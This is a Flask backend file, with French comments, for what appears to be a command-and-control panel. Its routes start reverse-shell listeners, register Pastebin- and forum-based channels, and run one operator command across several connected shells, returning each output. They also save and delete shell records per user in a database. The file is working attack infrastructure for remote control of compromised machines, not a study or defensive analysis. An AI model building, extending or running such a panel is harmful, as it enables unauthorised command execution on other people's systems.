from flask import request, jsonify, Blueprint, g
import jwt
from app.jwt_handler import verify_token, token_required
from .shell import Shell, Pastbin, Forum
from DB import get_db_connection


terminal = Blueprint('dashboard', __name__)
listener= Blueprint('listener', __name__)
shells_list_bp = Blueprint('shells_list', __name__)
supprimer_shell_bp = Blueprint('supprimer_shell', __name__)

instances = {}
shell_temp = {}

@terminal.route('/terminal', methods=['GET', 'POST'])
@token_required
def terminal_command():
    data = request.get_json()

    command = data['commande']
    shell_user = data['shell']
    results = {}

    # on boucle sur l'ensemble des shell ou l'on veux executer la commade
    for shell_temp in shell_user:
        shell_instance = instances[shell_temp]
        try:
            output = shell_instance.execute(command)
        except Exception as e:
            output = f"Erreur: {str(e)}"

        # Transforme les sauts de ligne en <br> pour un affichage HTML correct
        output = output.replace('\n', '<br>')

        results[shell_temp] = output

    return jsonify({"resulat": results})


@listener.route('/listener', methods=['POST'])
@token_required
def listener_command():
    data = request.get_json()
    print(data)
    nom = data['nom']
    ip = data['host']
    port = data['port']
    types = data['type']
    user = data['user']
    password = data['password']
    print(types)

    user_info = g.user_data  # Données décodées du token
    user_id = user_info["user_id"]
    if types == "reverse shell":
        shell_temp[nom] = Shell(port)
        print("nom :", nom)
        if shell_temp[nom].listen():
            instances[nom] = shell_temp[nom]
            del shell_temp[nom]


            save_shell_to_db(user_id, nom, "shell")

        else:
            print("erreur de connexion")


        return jsonify({"resulat": "sa fcontion"})

    elif types == "Pastbin":
        instances[nom] = Pastbin(nom)
        save_shell_to_db(user_id, nom, "Pastbin")
        print("nom :", nom)

        return jsonify({"resulat": "sa fcontion"})

    elif types == "forume":
        instances[nom] = Forum(ip, port, user, password, nom)
        save_shell_to_db(user_id, nom, "Forum")
        print("nom :", nom)

        return jsonify({"resulat": "sa fcontion"})

    else:
        pass
    print("erreur")
    return jsonify({"resulat": "erreur"})


@shells_list_bp.route('/shells_list', methods=['GET', 'POST'])
@token_required
def shells_list():
    shells = []
    user_data = g.user_data
    user_id = user_data["user_id"]

    conn = get_db_connection()
    cursor = conn.cursor()

    cursor.execute("""SELECT * FROM shell WHERE id_proprietaire = %s""", (user_id,))

    rows = cursor.fetchall()
    for i in rows:
        shells.append(i)

    print(shells)

    conn.close()
    return jsonify(shells)


@supprimer_shell_bp.route('/supprimer_shell', methods=['POST'])
@token_required
def supprimer_shell():
    data = request.get_json()
    id = data["id"]

    user_data = g.user_data
    user_id = user_data["user_id"]


    conn = get_db_connection()
    cursor = conn.cursor()

    cursor.execute("""SELECT * FROM shell WHERE id = %s and id_proprietaire = %s""", (id, user_id,))

    rows = cursor.fetchone()
    if rows is not None:

        id_shell = rows["id"]
        id_proprietaire = rows["id_proprietaire"]
        nom = rows["nom"]
        if id_proprietaire == user_id:
            cursor.execute("""DELETE FROM shell WHERE id = %s""", (id_shell,))
            conn.commit()
            print("supprimer ", nom, " de la DB")
        else:
            print("erreur, pas le proprietaire")


    conn.close()

    return jsonify({"resulat": "supprimer"})


def save_shell_to_db(user_id, nom, type):
    conn = get_db_connection()
    cursor = conn.cursor()

    cursor.execute("""
                   INSERT INTO shell (id_proprietaire, nom, type_shell)
                   VALUES (%s, %s, %s)
                   """, (user_id, nom, type))

    conn.commit()
    conn.close()

